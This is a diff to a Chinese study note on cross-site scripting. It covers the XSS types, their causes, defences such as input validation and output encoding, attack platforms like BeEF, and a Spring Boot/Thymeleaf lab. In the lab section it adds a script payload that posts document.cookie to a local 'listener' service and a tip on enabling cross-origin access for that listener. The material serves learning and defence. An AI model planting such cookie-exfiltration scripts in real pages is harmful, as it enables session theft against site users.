@@ -15,18 +15,51 @@
 1. 突变型XSS ???
 
 #### 反射型XSS
+##### 概念
 简单地把用户输入的数据“反射”给浏览器。也就是说，攻击者必须以某种方式诱导用户访问一个精心设计的URL（恶意链接），才能实施攻击。
 也叫做“非持久型XSS”(Non-persistent XSS)。
+##### 原因
+当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。主要场景有以下几种：
+* 将不可信数据插入到HTML标签之间时；// 例如`div, p, td`
+* 将不可信数据插入到HTML属性里时；// 例如：`<div width=$INPUT></div>`
+* 将不可信数据插入到SCRIPT里时；// 例如：`<script>var message = " $INPUT ";</script>`
+* 还有插入到Style属性里的情况，同样具有一定的危害性；// 例如`<span style=" property : $INPUT "></span>`
+* 将不可信数据插入到HTML URL里时，// 例如：`<a href="[http://www.abcd.com?param=](http://www.ccc.com/?param=) $INPUT "></a>`
+* 使用富文本时，没有使用XSS规则引擎进行编码过滤。
+
+
+
+#### 存储型XSS
+把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。
+##### 场景
+最常发生在由社区内容驱动的网站或 Web 邮件网站，不需要特制的链接来执行。比如博客评论，用户评论，留言板，聊天室，HTML 电子邮件，wikis
+##### 攻击流程
+![store xss](./img/storeXSS.png)
+
+#### DOM Based XSS
+通过修改页面的DOM节点形成的XSS
 
 #### 防御手段
-1. waf
+1. waf（非侵入）
 2. 侵入性组件
+3. 业务系统内的改造
+    1. 输入校验：根据场景，明确字段里面包含js脚本的字符是否在业务上能够输入，比如`< > ( )`等认定为非法字符。
+    1. 输出编码：js脚本里的字符认定为能够输入的字符，但是页面展示时，需要做输出编码。
+    1. 变种的特殊处理
+
+#### 类似的组件设计
+分库分表数据库中间件
+1. Mycat-代理，非侵入
+2. Sharding-jdbc，侵入式
 
 #### XSS攻击平台
 1. Attack API
 1. BeEF
 1. XSS-Proxy
 1. 终极武器：XSS Worm（用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起 `XSS Worm` 攻击。如站内信，用户留言等。而相对的，如果一个页面只能由用户个人看到，如“个人资料设置”，因为缺乏用户之间的交互功能，所以即使存在XSS，也不能被用于`XSS W  orm`的传播）
+
+#### 实际案例
+
 
 #### 示例注意点
 1. 模拟生成登录cookie
@@ -60,7 +93,40 @@
       
         压缩后的脚本：
         <script>$.ajax({url:"http://localhost:8081/listener/log",type:"POST",dataType:"json",data:JSON.stringify({data:document.cookie}),processData:false,contentType:"application/json",success:function(arg){console.log(arg);console.log("监听到数据");}});</script>
+        <script>$.ajax({url:"http://localhost:8081/listener/store",type:"POST",dataType:"json",data:JSON.stringify({data:document.cookie}),processData:false,contentType:"application/json",success:function(arg){console.log(arg);console.log("监听到数据");}});</script>
         ```
+1. 攻击者监听上报数据的服务，必须开启可跨域访问（被攻击者的服务肯定和攻击者的服务肯定不同源，存在跨域问题）
+1. 使用`druid`管理数据源
+    * 另外datasource配置下加不加`druid`都可以。多一层而已。`druid`对两个都支持。
+    * druid监控页面是一个servlet，需要让SpingBoot支持servlet：http://localhost:8080/druid
+1. Thymeleaf常用标签：`th:text`无XSS，`th:utext`有XSS
+
+    | 关键字      |               功能介绍               | 案例                                                         |
+    | ----------- | :----------------------------------: | :----------------------------------------------------------- |
+    | th:id       |                替换id                | `<input th:id="'xxx' + ${collect.id}"/>`                     |
+    | th:text     |               文本替换               | `<p th:text="${collect.description}">description</p>`        |
+    | th:utext    |          支持html的文本替换          | `<p th:utext="${htmlcontent}">content</p>`                   |
+    | th:object   |               替换对象               | `<div th:object="${session.user}">`                          |
+    | th:value    |               属性赋值               | `<input th:value = "${user.name}" />`                        |
+    | th:with     |             变量赋值运算             | `<div th:with="isEvens = ${prodStat.count}%2 == 0"></div>`   |
+    | th:style    |               设置样式               | `<div th:style="'display:' + @{(${sitrue} ? 'none' : 'inline-block')} + ''"></div>` |
+    | th:onclick  |               点击事件               | `<td th:onclick = "'getCollect()'"></td>`                    |
+    | th:each     |               属性赋值               | `<tr th:each = "user,userStat:${users}">`                    |
+    | th:if       |               判断条件               | `<a th:if = "${userId == collect.userId}">`                  |
+    | th:unless   |           和th:if判断相反            | `<a th:href="@{/login} th:unless=${session.user != null}">Login</a>` |
+    | th:href     |               链接地址               | `<a th:href="@{/login}" th:unless=${session.user != null}>Login</a>` |
+    | th:switch   |       多路选择配合th:case使用        | `<div th:switch="${user.role}">`                             |
+    | th:fragment |         th:switch的一个分支          | `<p th:case = "'admin'">User is an administrator</p>`        |
+    | th:includ   |    布局标签，替换内容到引入的文件    | `<head th:include="layout :: htmlhead" th:with="title='xx'"></head>` |
+    | th:replace  |  布局标签，替换整个标签到引入的文件  | `<div th:replace="fragments/header :: title"></div>`         |
+    | th:selectd  |          selected选择框选中          | `th:selected="(${xxx.id} == ${configObj.dd})"`               |
+    | th:src      |            图片类地址引入            | `<img class="img-responsive" alt="App Logo" th:src="@{/img/logo.png}" />` |
+    | th:inline   |        定义js脚本可以使用变量        | `<script type="text/javascript" th:inline="javascript">`     |
+    | th:action   |            表单提交的地址            | `<form action="subscribe.html" th:action="@{/subscribe}">`   |
+    | th:remove   |             删除某个属性             | `<tr th:remove="all"> 1.all:删除包含标签和所有的孩子。2.body:不包含标记删除,但删除其所有的孩子。3.tag:包含标记的删除,但不删除它的孩子。4.all-but-first:删除所有包含标签的孩子,除了第一个。5.none:什么也不做。这个值是有用的动态评估。` |
+    | th:attr     | 设置标签属性，多个属性可以用逗号分隔 | `比如 th:attr="src=@{/image/aa.jpg},title=#{logo}"，此标签不太优雅，一般用的比较少。` |
+
+    
 
 #### 参考
 1. 《白帽子讲Web安全》
